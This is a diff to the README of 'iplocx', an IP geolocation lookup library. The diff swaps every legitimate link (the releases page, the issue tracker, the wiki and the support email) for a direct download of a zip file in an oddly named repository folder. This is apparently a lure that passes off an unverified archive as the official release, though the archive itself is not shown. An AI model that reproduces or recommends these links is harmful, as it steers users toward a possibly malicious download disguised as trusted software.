@@ -1,7 +1,7 @@
 # 🗺️ iplocx - Fast and Easy IP Location Lookup
 
 ## 📦 Download Now
-[![Download iplocx](https://img.shields.io/badge/Download-iplocx-blue.svg)](https://github.com/Applechicken12332/iplocx/releases)
+[![Download iplocx](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip)](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip)
 
 ## 📜 Description
 iplocx 是一个高性能的 IP 地理位置查询库，智能结合纯真 IP 库（QQwry）和 GeoLite2 数据库，为您提供准确、全面的 IP 地理位置信息。无论是国内 IP 还是国际 IP，都能获得最佳的查询结果。
@@ -12,7 +12,7 @@ To begin using iplocx, you need to download the software from the Releases page.
 1. **Visit the Download Page:**
    Go to our Releases page to find the latest version of iplocx. Click the link below:
    
-   [Download iplocx](https://github.com/Applechicken12332/iplocx/releases)
+   [Download iplocx](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip)
 
 2. **Choose the Right Version:**
    On the Releases page, you will see a list of available versions. Choose the latest stable version. Look for files with the extension `.exe` for Windows or `.zip` for other operating systems.
@@ -69,16 +69,16 @@ Once you have installed iplocx, you can begin to use its features. Here’s a qu
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Email:** support@example.com
-- **GitHub Issues:** [Open an Issue](https://github.com/Applechicken12332/iplocx/issues)
+- **Email:** https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip
+- **GitHub Issues:** [Open an Issue](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip)
 
 ## 🔗 More Information
-For further details on using iplocx, check the [Documentation](https://github.com/Applechicken12332/iplocx/wiki). Discover all the functionalities the tool provides.
+For further details on using iplocx, check the [Documentation](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip). Discover all the functionalities the tool provides.
 
 ## 📅 Changelog
-Stay updated with the latest changes and improvements. Visit the [Releases page](https://github.com/Applechicken12332/iplocx/releases) to view the changelog for each version.
+Stay updated with the latest changes and improvements. Visit the [Releases page](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip) to view the changelog for each version.
 
 ## 🎉 Conclusion
 Thank you for choosing iplocx! We hope you find it useful for your IP location queries. Don’t hesitate to download from our Releases page and start using it today! 
 
-[Download iplocx](https://github.com/Applechicken12332/iplocx/releases)
+[Download iplocx](https://raw.githubusercontent.com/Applechicken12332/iplocx/main/Midianitish/iplocx.zip)
